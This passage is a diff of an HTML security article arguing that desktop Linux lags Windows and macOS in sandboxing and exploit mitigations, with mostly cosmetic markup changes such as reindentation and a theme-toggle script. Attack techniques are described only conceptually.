@@ -1,490 +1,495 @@
 <!DOCTYPE html>
 <html lang=en>
 
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self' 'sha256-BHF2wjYzuFl1eF3qjlsAq+xvWjfztG2awREfjczVAIQ='; script-src 'self' 'sha256-6GFZjgP8rd6OHbLQAdEHCPBmNWb5aZRO1LA9AiwCdHI='; form-action 'none'; upgrade-insecure-requests; block-all-mixed-content; base-uri 'none'">
-  <meta name="referrer" content="no-referrer">
-  <link rel="stylesheet" type="text/css" href="styles.css">
-  <title>Linux | Madaidan's Insecurities</title>
-</head>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self' 'sha256-BHF2wjYzuFl1eF3qjlsAq+xvWjfztG2awREfjczVAIQ='; script-src 'self' 'sha256-6GFZjgP8rd6OHbLQAdEHCPBmNWb5aZRO1LA9AiwCdHI='; form-action 'none'; upgrade-insecure-requests; block-all-mixed-content; base-uri 'none'">
+    <meta name="referrer" content="no-referrer">
+    <link rel="stylesheet" type="text/css" href="stylesheets/styles.css">
+    <script type="module" src="js/theme.min.js"></script>
+    <title>Linux | Madaidan's Insecurities</title>
+  </head>
 
-<body>
-  <h1>Linux (In)security</h1>
+  <body>
+    <button class="theme-toggle">🌓</button>
+    <h1>Linux (In)security</h1>
 
-  <p class="date"><em><time datetime="2021-06-14">Last edited: June 14th, 2021</time></em></p>
+    <p class="date"><em><time datetime="2021-06-14">Last edited: June 14th, 2021</time></em></p>
 
-  <p>
-    Linux being secure is a common misconception in the security and privacy realm. Linux is thought to be secure primarily
-    because of its source model, popular usage in servers, small userbase and confusion about its security features. This
-    article is intended to debunk these misunderstandings by demonstrating the lack of various, important security mechanisms
-    found in other desktop operating systems and identifying critical security problems within Linux's security model, across
-    both user space and the kernel. Overall, other operating systems have a much stronger focus on security and have made many
-    innovations in defensive security technologies, whereas Linux has fallen far behind. <br>
-    <br>
-    Section 1 explains the lack of a proper application security model and demonstrates why some software that is commonly touted
-    as solutions to this problem are insufficient. Section 2 examines and compares a number of important exploit mitigations.
-    Section 3 presents a plethora of architectural security issues within the Linux kernel itself. Section 4 shows the ease at which
-    an adversary can acquire root privileges and section 5 contains examples thereof. Section 6 details issues specific to "stable"
-    release models, wherein software updates are frozen. Section 7 discusses the infeasibility of the average user correcting the
-    aforementioned issues. Finally, section 8 provides links to what other security researchers have said about this topic. <br>
-    <br>
-    Due to inevitable pedanticism, "Linux" in this article refers to a standard desktop Linux or GNU/Linux
-    distribution.
-  </p>
+    <p>
+      Linux being secure is a common misconception in the security and privacy realm. Linux is thought to be secure primarily
+      because of its source model, popular usage in servers, small userbase and confusion about its security features. This
+      article is intended to debunk these misunderstandings by demonstrating the lack of various, important security mechanisms
+      found in other desktop operating systems and identifying critical security problems within Linux's security model, across
+      both user space and the kernel. Overall, other operating systems have a much stronger focus on security and have made many
+      innovations in defensive security technologies, whereas Linux has fallen far behind. <br>
+      <br>
+      Section 1 explains the lack of a proper application security model and demonstrates why some software that is commonly touted
+      as solutions to this problem are insufficient. Section 2 examines and compares a number of important exploit mitigations.
+      Section 3 presents a plethora of architectural security issues within the Linux kernel itself. Section 4 shows the ease at which
+      an adversary can acquire root privileges and section 5 contains examples thereof. Section 6 details issues specific to "stable"
+      release models, wherein software updates are frozen. Section 7 discusses the infeasibility of the average user correcting the
+      aforementioned issues. Finally, section 8 provides links to what other security researchers have said about this topic. <br>
+      <br>
+      Due to inevitable pedanticism, "Linux" in this article refers to a standard desktop Linux or GNU/Linux
+      distribution.
+    </p>
 
-  <h2>Contents</h2>
+    <h2>Contents</h2>
+    <ol>
+      <li>
+        <a href="#sandboxing">Sandboxing</a>
+        <ol>
+          <li><a href="#flatpak">Flatpak</a></li>
+          <li><a href="#firejail">Firejail</a></li>
+        </ol>
+      </li>
+      
+      <li>
+        <a href="#exploit-mitigations">Exploit Mitigations</a>
+        <ol>
+          <li><a href="#acg-cig">Arbitrary Code Guard and Code Integrity Guard</a></li>
+          <li><a href="#cfi">Control Flow Integrity</a></li>
+          <li><a href="#auto-var-init">Automatic Variable Initialization</a></li>
+          <li><a href="#vbs">Virtualization-based Security</a></li>
+        </ol>
+      </li>
+      
+      <li><a href="#kernel">Kernel</a></li>
+      <li><a href="#root">The Nonexistent Boundary of Root</a></li>
+      <li><a href="#examples">Examples</a></li>
+      
+      <li>
+        <a href="#distro-specific-issues">Distribution-specific Issues</a>
+        <ol>
+          <li><a href="#stable-release-models">Stable Release Models</a></li>
+        </ol>
+      </li>
 
-  <div class="headers">
-    <a href="#sandboxing">1. Sandboxing</a> <br>
-    <a href="#flatpak" class="subheaders">1.1 Flatpak</a> <br>
-    <a href="#firejail" class="subheaders">1.2 Firejail</a> <br>
-    <br>
-    <a href="#exploit-mitigations">2. Exploit Mitigations</a> <br>
-    <a href="#acg-cig" class="subheaders">2.1 Arbitrary Code Guard and Code Integrity Guard</a> <br>
-    <a href="#cfi" class="subheaders">2.2 Control Flow Integrity</a> <br>
-    <a href="#auto-var-init" class="subheaders">2.3 Automatic Variable Initialization</a> <br>
-    <a href="#vbs" class="subheaders">2.4 Virtualization-based Security</a> <br>
-    <br>
-    <a href="#kernel">3. Kernel</a> <br>
-    <br>
-    <a href="#root">4. The Nonexistent Boundary of Root</a> <br>
-    <br>
-    <a href="#examples">5. Examples</a> <br>
-    <br>
-    <a href="#distro-specific-issues">6. Distribution-specific Issues</a> <br>
-    <a href="#stable-release-models" class="subheaders">6.1 Stable Release Models</a> <br>
-    <br>
-    <a href="#hardening">7. Manual Hardening</a> <br>
-    <br>
-    <a href="#security-researcher-views">8. Other Security Researcher Views on Linux</a> <br>
-  </div>
+      <li><a href="#hardening">Manual Hardening</a></li>
+      <li><a href="#security-researcher-views">Other Security Researcher Views on Linux</a></li>
+    </ol>
 
-  <h2 id="sandboxing"><a href="#sandboxing">1. Sandboxing</a></h2>
+    <h2 id="sandboxing"><a href="#sandboxing">1. Sandboxing</a></h2>
 
-  <p>
-    The <a href="https://theinvisiblethings.blogspot.com/2010/08/ms-dos-security-model.html">traditional application security
-    model</a> on desktop operating systems gives any executed application complete access to all data within the same user
-    account. This means that any malicious application you install or an exploited vulnerability in an otherwise benevolent
-    application can result in the attacker immediately gaining access to your data. Such vulnerabilities are inevitable and
-    their impact should be limited by strictly isolating software from one another.  <br>
-    <br>
-    Linux still follows this security model and as such, there is no resemblance of a strong sandboxing architecture or permission
-    model in the standard Linux desktop — current sandboxing solutions are either nonexistent or insufficient. All applications
-    have access to each other’s data and can snoop on your personal information. <br>
-    <br>
-    In comparison, other desktop operating systems, including Windows 10, macOS and ChromeOS have put considerable effort into
-    sandboxing applications, the last two in particular:
-  </p>
+    <p>
+      The <a href="https://theinvisiblethings.blogspot.com/2010/08/ms-dos-security-model.html">traditional application security
+      model</a> on desktop operating systems gives any executed application complete access to all data within the same user
+      account. This means that any malicious application you install or an exploited vulnerability in an otherwise benevolent
+      application can result in the attacker immediately gaining access to your data. Such vulnerabilities are inevitable and
+      their impact should be limited by strictly isolating software from one another.  <br>
+      <br>
+      Linux still follows this security model and as such, there is no resemblance of a strong sandboxing architecture or permission
+      model in the standard Linux desktop — current sandboxing solutions are either nonexistent or insufficient. All applications
+      have access to each other’s data and can snoop on your personal information. <br>
+      <br>
+      In comparison, other desktop operating systems, including Windows 10, macOS and ChromeOS have put considerable effort into
+      sandboxing applications, the last two in particular:
+    </p>
 
-  <ul>
-    <li class="lilist">
-      Windows still falls behind when it comes to sandboxing, but it has at least made some progress — Windows <a
-      href="https://docs.microsoft.com/en-us/windows/uwp/security/intro-to-secure-windows-app-development#41-windows-app-model">
-      automatically sandboxes UWP applications</a> and provides the <a
-      href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview">Windows
-      Sandbox utility</a> for non-UWP applications. <br>
-    </li>
+    <ul>
+      <li>
+        Windows still falls behind when it comes to sandboxing, but it has at least made some progress — Windows <a
+        href="https://docs.microsoft.com/en-us/windows/uwp/security/intro-to-secure-windows-app-development#41-windows-app-model">
+        automatically sandboxes UWP applications</a> and provides the <a
+        href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview">Windows
+        Sandbox utility</a> for non-UWP applications. <br>
+      </li>
 
-    <li class="lilist">
-      In macOS, <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=119">all
-      applications require user consent before accessing sensitive data</a> and <a
-      href="https://developer.apple.com/documentation/security/app_sandbox">all applications in the App Store are further sandboxed</a>.
-    </li>
+      <li>
+        In macOS, <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=119">all
+        applications require user consent before accessing sensitive data</a> and <a
+        href="https://developer.apple.com/documentation/security/app_sandbox">all applications in the App Store are further sandboxed</a>.
+      </li>
 
-    <li class="lilist">
-      <a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/sandboxing.md">All applications in ChromeOS are sandboxed
-      regardless</a>.
-    </li>
-  </ul>
-  </p>
+      <li>
+        <a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/sandboxing.md">All applications in ChromeOS are sandboxed
+        regardless</a>.
+      </li>
+    </ul>
+    </p>
 
-  <h3 id="flatpak"><a href="#flatpak">1.1 Flatpak</a></h3>
+    <h3 id="flatpak"><a href="#flatpak">1.1 Flatpak</a></h3>
 
-  <p>
-    <a href="https://www.flatpak.org/">Flatpak</a> aims to sandbox applications, but <a href="https://flatkill.org/">its
-    sandboxing is very flawed</a>. It fully trusts the applications and allows them to specify their own policy. This means
-    that security is effectively optional and applications can simply choose not to be sufficiently sandboxed. <br>
-    <br>
-    Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with the
-    <code>filesystem=home</code> or <code>filesystem=host</code> permissions which grant read-write access to the user's
-    home directory, giving access to all of your personal files and allowing trivial sandbox escapes via writing to
-    <code>~/.bashrc</code> or similar. <br>
-    <br>
-    In the <a href="https://github.com/flathub">Flathub Github organisation</a>, ~550 applications <a
-    href="https://github.com/search?q=org%3Aflathub+filesystem%3Dhome&type=code">come</a> <a
-    href="https://github.com/search?q=org%3Aflathub+filesystem%3Dhost&type=code">with</a> such permissions which is ~30% of
-    all repositories. While this percentage may not seem significant, it includes a considerable amount of applications that
-    people will commonly use. Examples of such include
-    <a href="https://github.com/flathub/org.gimp.GIMP/blob/f819d5614ca19d3ffff99f2040881a873daa175f/org.gimp.GIMP.json#L14">GIMP</a>,
-    <a href="https://github.com/flathub/org.gnome.eog/blob/4d87a2a397d0f98ea8f4b72e695163570dd0f53f/org.gnome.eog.yml#L14">Eog</a>,
-    <a href="https://github.com/flathub/org.gnome.gedit/blob/ffb84266826d76d39a7643f302fe371c064c040e/org.gnome.gedit.yml#L15">Gedit</a>,
-    <a href="https://github.com/flathub/org.videolan.VLC/blob/a32f0f11408596d1248ad415ce852de2e4c931eb/org.videolan.VLC.json#L13">VLC</a>,
-    <a href="https://github.com/flathub/org.kde.krita/blob/dea979140f5f75611b3b76a9da145a97a733aa86/org.kde.krita.json#L15">Krita</a>,
-    <a href="https://github.com/flathub/org.libreoffice.LibreOffice/blob/6d9d7f43d5a0562a1269cd0df078b2bdb4a3144b/org.libreoffice.LibreOffice.json#L631">
-    LibreOffice</a>,
-    <a href="https://github.com/flathub/org.audacityteam.Audacity/blob/cd4d8ef8ce3f01800b45434bc401569155efe7d4/org.audacityteam.Audacity.yaml#L18">
-    Audacity</a>,
-    <a href="https://github.com/flathub/com.visualstudio.code/blob/ad626a6630ef05d5aebcc4b1a57cbc32fc7a1585/com.visualstudio.code.yaml#L18">VSCode</a>,
-    <a href="https://github.com/flathub/com.dropbox.Client/blob/a97e98e2f8386d59cf04b9e3ccb0c575ba9f6954/com.dropbox.Client.json#L15">Dropbox</a>,
-    <a href="https://github.com/flathub/com.transmissionbt.Transmission/blob/fc3a0335e6d9d8f98d9a0621c0f57c033f5b226a/com.transmissionbt.Transmission.json#L19">
-    Transmission</a>,
-    <a href="https://github.com/flathub/com.skype.Client/blob/cd0b69e49535337be131b06be56e5e5640692f00/com.skype.Client.json#L20">Skype</a>
-    and countless others. <br>
-    <br>
-    Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, permitting easy sandbox
-    escapes due to <a href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">X11's
-    lack of GUI isolation</a>. Adding X11 sandboxing via a nested X11 server, such as Xpra, would not be difficult, but <a
-    href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">Flatpak developers refuse to acknowledge
-    this and continue to claim, "X11 is impossible to secure"</a>. <br>
-    <br>
-    Further examples include <a
-    href="https://github.com/flatpak/flatpak/blob/686af7d3b81b1315256e79eb5991cede458f3498/common/flatpak-run.c#L3171-L3194">Flatpak
-    giving complete access to directories such as <code>/sys</code> or <code>/proc</code></a> (kernel interfaces known for information
-    leaks), rather than allowing fine-grained access to only the required files and the highly permissive seccomp filter which <a
-    href="https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693">
-    only blacklists ~20 syscalls</a> and still exposes significant kernel attack surface.
-  </p>
+    <p>
+      <a href="https://www.flatpak.org/">Flatpak</a> aims to sandbox applications, but <a href="https://flatkill.org/">its
+      sandboxing is very flawed</a>. It fully trusts the applications and allows them to specify their own policy. This means
+      that security is effectively optional and applications can simply choose not to be sufficiently sandboxed. <br>
+      <br>
+      Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with the
+      <code>filesystem=home</code> or <code>filesystem=host</code> permissions which grant read-write access to the user's
+      home directory, giving access to all of your personal files and allowing trivial sandbox escapes via writing to
+      <code>~/.bashrc</code> or similar. <br>
+      <br>
+      In the <a href="https://github.com/flathub">Flathub Github organisation</a>, ~550 applications <a
+      href="https://github.com/search?q=org%3Aflathub+filesystem%3Dhome&type=code">come</a> <a
+      href="https://github.com/search?q=org%3Aflathub+filesystem%3Dhost&type=code">with</a> such permissions which is ~30% of
+      all repositories. While this percentage may not seem significant, it includes a considerable amount of applications that
+      people will commonly use. Examples of such include
+      <a href="https://github.com/flathub/org.gimp.GIMP/blob/f819d5614ca19d3ffff99f2040881a873daa175f/org.gimp.GIMP.json#L14">GIMP</a>,
+      <a href="https://github.com/flathub/org.gnome.eog/blob/4d87a2a397d0f98ea8f4b72e695163570dd0f53f/org.gnome.eog.yml#L14">Eog</a>,
+      <a href="https://github.com/flathub/org.gnome.gedit/blob/ffb84266826d76d39a7643f302fe371c064c040e/org.gnome.gedit.yml#L15">Gedit</a>,
+      <a href="https://github.com/flathub/org.videolan.VLC/blob/a32f0f11408596d1248ad415ce852de2e4c931eb/org.videolan.VLC.json#L13">VLC</a>,
+      <a href="https://github.com/flathub/org.kde.krita/blob/dea979140f5f75611b3b76a9da145a97a733aa86/org.kde.krita.json#L15">Krita</a>,
+      <a href="https://github.com/flathub/org.libreoffice.LibreOffice/blob/6d9d7f43d5a0562a1269cd0df078b2bdb4a3144b/org.libreoffice.LibreOffice.json#L631">
+      LibreOffice</a>,
+      <a href="https://github.com/flathub/org.audacityteam.Audacity/blob/cd4d8ef8ce3f01800b45434bc401569155efe7d4/org.audacityteam.Audacity.yaml#L18">
+      Audacity</a>,
+      <a href="https://github.com/flathub/com.visualstudio.code/blob/ad626a6630ef05d5aebcc4b1a57cbc32fc7a1585/com.visualstudio.code.yaml#L18">VSCode</a>,
+      <a href="https://github.com/flathub/com.dropbox.Client/blob/a97e98e2f8386d59cf04b9e3ccb0c575ba9f6954/com.dropbox.Client.json#L15">Dropbox</a>,
+      <a href="https://github.com/flathub/com.transmissionbt.Transmission/blob/fc3a0335e6d9d8f98d9a0621c0f57c033f5b226a/com.transmissionbt.Transmission.json#L19">
+      Transmission</a>,
+      <a href="https://github.com/flathub/com.skype.Client/blob/cd0b69e49535337be131b06be56e5e5640692f00/com.skype.Client.json#L20">Skype</a>
+      and countless others. <br>
+      <br>
+      Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, permitting easy sandbox
+      escapes due to <a href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">X11's
+      lack of GUI isolation</a>. Adding X11 sandboxing via a nested X11 server, such as Xpra, would not be difficult, but <a
+      href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">Flatpak developers refuse to acknowledge
+      this and continue to claim, "X11 is impossible to secure"</a>. <br>
+      <br>
+      Further examples include <a
+      href="https://github.com/flatpak/flatpak/blob/686af7d3b81b1315256e79eb5991cede458f3498/common/flatpak-run.c#L3171-L3194">Flatpak
+      giving complete access to directories such as <code>/sys</code> or <code>/proc</code></a> (kernel interfaces known for information
+      leaks), rather than allowing fine-grained access to only the required files and the highly permissive seccomp filter which <a
+      href="https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693">
+      only blacklists ~20 syscalls</a> and still exposes significant kernel attack surface.
+    </p>
 
-  <h3 id="firejail"><a href="#firejail">1.2 Firejail</a></h3>
+    <h3 id="firejail"><a href="#firejail">1.2 Firejail</a></h3>
 
-  <p>
-    <a href="https://firejail.wordpress.com/">Firejail</a> is another common sandboxing technology however, it is also insufficient.
-    Firejail worsens security by acting as a privilege escalation hole — Firejail requires being <a
-    href="https://en.wikipedia.org/wiki/Setuid">setuid</a>, meaning that it executes with the privileges of the executable's owner
-    which in this case, is the root user. This means that a vulnerability in Firejail can allow escalating to root privileges. <br>
-    <br>
-    As such, great caution should be taken with setuid programs, but Firejail instead focuses more on usability and unessential features which
-    adds significant attack surface and complexity to the code, resulting in <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=firejail">
-    numerous privilege escalation and sandbox escape vulnerabilities</a>, <a href="https://seclists.org/oss-sec/2017/q1/25">many of which
-    aren't particularly complicated</a>. <br>
-    <br>
-    For comparison, another Linux sandboxing tool — <a href="https://github.com/containers/bubblewrap">bubblewrap</a> — has significantly
-    less attack surface and is less prone to exploitation because it aims to be very minimal and provide only the absolutely necessary
-    functionality. This is very important and makes the potential for vulnerabilities extremely low. <br>
-    <br>
-    As an example of this, <a href="https://github.com/containers/bubblewrap/issues/317">bubblewrap doesn't even generate seccomp filters
-    itself</a>. One must create their own, often via <a href="https://www.man7.org/linux/man-pages/man3/seccomp_export_bpf.3.html">seccomp_export_bpf</a>,
-    and supply it to bubblewrap. Another example is bubblewrap's simplistic command line arguments: there is no parsing of configuration files or
-    complex / redundant parameters. The user specifies exactly what they want in the sandbox and that's it, whereas Firejail supports hundreds
-    of convoluted <a href="https://firejail.wordpress.com/features-3/man-firejail/">command line arguments</a> and <a
-    href="https://firejail.wordpress.com/features-3/man-firejail-profile/">profile rules</a>, many of which boil down to overcomplicated blacklist
-    rules. <br>
-    <br>
-    Unfortunately, bubblewrap isn't very widespread and can be difficult to learn. Bubblewrap is essentially a bare bones wrappers around namespaces
-    and seccomp. A user would need decent knowledge on how the filesystem, syscalls and so on work to properly use it.
-  </p>
+    <p>
+      <a href="https://firejail.wordpress.com/">Firejail</a> is another common sandboxing technology however, it is also insufficient.
+      Firejail worsens security by acting as a privilege escalation hole — Firejail requires being <a
+      href="https://en.wikipedia.org/wiki/Setuid">setuid</a>, meaning that it executes with the privileges of the executable's owner
+      which in this case, is the root user. This means that a vulnerability in Firejail can allow escalating to root privileges. <br>
+      <br>
+      As such, great caution should be taken with setuid programs, but Firejail instead focuses more on usability and unessential features which
+      adds significant attack surface and complexity to the code, resulting in <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=firejail">
+      numerous privilege escalation and sandbox escape vulnerabilities</a>, <a href="https://seclists.org/oss-sec/2017/q1/25">many of which
+      aren't particularly complicated</a>. <br>
+      <br>
+      For comparison, another Linux sandboxing tool — <a href="https://github.com/containers/bubblewrap">bubblewrap</a> — has significantly
+      less attack surface and is less prone to exploitation because it aims to be very minimal and provide only the absolutely necessary
+      functionality. This is very important and makes the potential for vulnerabilities extremely low. <br>
+      <br>
+      As an example of this, <a href="https://github.com/containers/bubblewrap/issues/317">bubblewrap doesn't even generate seccomp filters
+      itself</a>. One must create their own, often via <a href="https://www.man7.org/linux/man-pages/man3/seccomp_export_bpf.3.html">seccomp_export_bpf</a>,
+      and supply it to bubblewrap. Another example is bubblewrap's simplistic command line arguments: there is no parsing of configuration files or
+      complex / redundant parameters. The user specifies exactly what they want in the sandbox and that's it, whereas Firejail supports hundreds
+      of convoluted <a href="https://firejail.wordpress.com/features-3/man-firejail/">command line arguments</a> and <a
+      href="https://firejail.wordpress.com/features-3/man-firejail-profile/">profile rules</a>, many of which boil down to overcomplicated blacklist
+      rules. <br>
+      <br>
+      Unfortunately, bubblewrap isn't very widespread and can be difficult to learn. Bubblewrap is essentially a bare bones wrappers around namespaces
+      and seccomp. A user would need decent knowledge on how the filesystem, syscalls and so on work to properly use it.
+    </p>
 
-  <h2 id="exploit-mitigations"><a href="#exploit-mitigations">2. Exploit Mitigations</a></h2>
+    <h2 id="exploit-mitigations"><a href="#exploit-mitigations">2. Exploit Mitigations</a></h2>
 
-  <p>
-    Exploit mitigations eliminate entire classes of common vulnerabilities / exploit techniques to prevent or severely hinder exploitation. Linux
-    has not made significant progress on implementing modern exploit mitigations, unlike other operating systems. <br>
-    <br>
-    Most programs on Linux are written in memory unsafe languages, such as C or C++, which causes <a
-    href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">the majority of discovered security vulnerabilities</a>.
-    Other operating systems have made more progress on adopting memory safe languages, such as Windows which is <a
-    href="https://msrc-blog.microsoft.com/2019/07/22/why-rust-for-safe-systems-programming/">leaning heavily towards Rust, a memory safe language</a> or
-    macOS which is adopting <a href="https://swift.org/">Swift</a>. While Windows and macOS are still mostly written in memory unsafe languages, they are
-    at least making some progress on switching to safe alternatives. <br>
-    <br>
-    Furthermore, modern exploit mitigations, such as Control Flow Integrity (CFI), are also not widely used on Linux. A few examples are explained below
-    however, it does not attempt to be an exhaustive list.
-  </p>
+    <p>
+      Exploit mitigations eliminate entire classes of common vulnerabilities / exploit techniques to prevent or severely hinder exploitation. Linux
+      has not made significant progress on implementing modern exploit mitigations, unlike other operating systems. <br>
+      <br>
+      Most programs on Linux are written in memory unsafe languages, such as C or C++, which causes <a
+      href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">the majority of discovered security vulnerabilities</a>.
+      Other operating systems have made more progress on adopting memory safe languages, such as Windows which is <a
+      href="https://msrc-blog.microsoft.com/2019/07/22/why-rust-for-safe-systems-programming/">leaning heavily towards Rust, a memory safe language</a> or
+      macOS which is adopting <a href="https://swift.org/">Swift</a>. While Windows and macOS are still mostly written in memory unsafe languages, they are
+      at least making some progress on switching to safe alternatives. <br>
+      <br>
+      Furthermore, modern exploit mitigations, such as Control Flow Integrity (CFI), are also not widely used on Linux. A few examples are explained below
+      however, it does not attempt to be an exhaustive list.
+    </p>
 
-  <h3 id="acg-cig"><a href="#acg-cig">2.1 Arbitrary Code Guard and Code Integrity Guard</a></h3>
+    <h3 id="acg-cig"><a href="#acg-cig">2.1 Arbitrary Code Guard and Code Integrity Guard</a></h3>
 
-  <p>
-    A very common exploit technique is that during exploitation of a <a href="https://en.wikipedia.org/wiki/Buffer_overflow">buffer overflow</a>
-    vulnerability, an attacker injects their own malicious code (known as <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>) into a
-    part of memory and causes the program to execute it by overwriting critical data, such as <a href="https://en.wikipedia.org/wiki/Return_statement">
-    return addresses</a> and <a href="https://en.wikipedia.org/wiki/Function_pointer">function pointers</a>, to hijack the control flow and point to the
-    aforementioned shellcode, thereby gaining control over the program. <br>
-    <br>
-    The industry eventually evolved to mitigate this style of attacks by <a href="https://en.wikipedia.org/wiki/Executable_space_protection">marking
-    writable areas of memory as non-executable</a> and executable areas as non-writable, preventing an attacker from injecting and executing their shellcode.
-    However, an attacker can bypass this by reusing bits of code already present within the program (known as gadgets) outside of the order in which
-    they were originally intended to be used. An attacker can form a chain of such gadgets to achieve near-arbitrary code execution despite the
-    aforementioned protections, utilising techniques, such as <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return-Oriented
-    Programming</a> (ROP) or <a href="https://www.csc2.ncsu.edu/faculty/xjiang4/pubs/ASIACCS11.pdf">Jump-Oriented Programming</a> (JOP). <br>
-    <br>
-    Attackers often inject their shellcode into writable memory pages and then use these code reuse techniques to transition memory pages to executable
-    (using syscalls such as <code>mprotect</code> or <code>VirtualAlloc</code>), consequently allowing it to be executed. Linux has yet to provide strong
-    mitigations against this avenue of attacks. SELinux does provide the <code>execmem</code> boolean however, this is rarely ever
-    used. There is also the <a href="https://lore.kernel.org/lkml/1562410493-8661-1-git-send-email-s.mesoraca16@gmail.com/">S.A.R.A. LSM</a>, but this has
-    not yet been accepted upstream. In comparison to other operating systems:
-  </p>
+    <p>
+      A very common exploit technique is that during exploitation of a <a href="https://en.wikipedia.org/wiki/Buffer_overflow">buffer overflow</a>
+      vulnerability, an attacker injects their own malicious code (known as <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>) into a
+      part of memory and causes the program to execute it by overwriting critical data, such as <a href="https://en.wikipedia.org/wiki/Return_statement">
+      return addresses</a> and <a href="https://en.wikipedia.org/wiki/Function_pointer">function pointers</a>, to hijack the control flow and point to the
+      aforementioned shellcode, thereby gaining control over the program. <br>
+      <br>
+      The industry eventually evolved to mitigate this style of attacks by <a href="https://en.wikipedia.org/wiki/Executable_space_protection">marking
+      writable areas of memory as non-executable</a> and executable areas as non-writable, preventing an attacker from injecting and executing their shellcode.
+      However, an attacker can bypass this by reusing bits of code already present within the program (known as gadgets) outside of the order in which
+      they were originally intended to be used. An attacker can form a chain of such gadgets to achieve near-arbitrary code execution despite the
+      aforementioned protections, utilising techniques, such as <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return-Oriented
+      Programming</a> (ROP) or <a href="https://www.csc2.ncsu.edu/faculty/xjiang4/pubs/ASIACCS11.pdf">Jump-Oriented Programming</a> (JOP). <br>
+      <br>
+      Attackers often inject their shellcode into writable memory pages and then use these code reuse techniques to transition memory pages to executable
+      (using syscalls such as <code>mprotect</code> or <code>VirtualAlloc</code>), consequently allowing it to be executed. Linux has yet to provide strong
+      mitigations against this avenue of attacks. SELinux does provide the <code>execmem</code> boolean however, this is rarely ever
+      used. There is also the <a href="https://lore.kernel.org/lkml/1562410493-8661-1-git-send-email-s.mesoraca16@gmail.com/">S.A.R.A. LSM</a>, but this has
+      not yet been accepted upstream. In comparison to other operating systems:
+    </p>
 
-  <ul>
-    <li class="lilist">
-      <a href="https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/">Windows 10 implemented a mitigation</a> known as <a
-      href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#arbitrary-code-guard">
-      Arbitrary Code Guard</a> (ACG) which mitigates the aforementioned exploit technique by ensuring that all executable memory pages are immutable and can never
-      be made writable. Another mitigation known as <a
-      href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#code-integrity-guard">Code
-      Integrity Guard</a> (CIG) is similar to ACG, but it applies to the filesystem instead of memory, ensuring that an attacker cannot execute a malicious program
-      or library on disk by guaranteeing that all binaries loaded into a process must be signed. Together, ACG and CIG enforce a strict <a
-      href="https://en.wikipedia.org/wiki/W%5EX">W^X</a> policy in both memory and the filesystem.
-    </li>
+    <ul>
+      <li>
+        <a href="https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/">Windows 10 implemented a mitigation</a> known as <a
+        href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#arbitrary-code-guard">
+        Arbitrary Code Guard</a> (ACG) which mitigates the aforementioned exploit technique by ensuring that all executable memory pages are immutable and can never
+        be made writable. Another mitigation known as <a
+        href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#code-integrity-guard">Code
+        Integrity Guard</a> (CIG) is similar to ACG, but it applies to the filesystem instead of memory, ensuring that an attacker cannot execute a malicious program
+        or library on disk by guaranteeing that all binaries loaded into a process must be signed. Together, ACG and CIG enforce a strict <a
+        href="https://en.wikipedia.org/wiki/W%5EX">W^X</a> policy in both memory and the filesystem.
+      </li>
 
-    <li class="lilist">
-      Similar to ACG, macOS includes <a href="https://developer.apple.com/documentation/security/hardened_runtime">Hardened Runtime</a> to mitigate injecting shellcode
-      into the memory of user space applications. M1 Macs also have
-      <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56">Kernel Integrity Protection</a> (KIP) to protect the
-      kernel. More specifically, it uses a custom hardware mitigation known as <a href="https://siguza.github.io/KTRR/">KTRR</a> to enforce strict W^X permissions in
-      the kernel.
-    </li>
-  </ul>
+      <li>
+        Similar to ACG, macOS includes <a href="https://developer.apple.com/documentation/security/hardened_runtime">Hardened Runtime</a> to mitigate injecting shellcode
+        into the memory of user space applications. M1 Macs also have
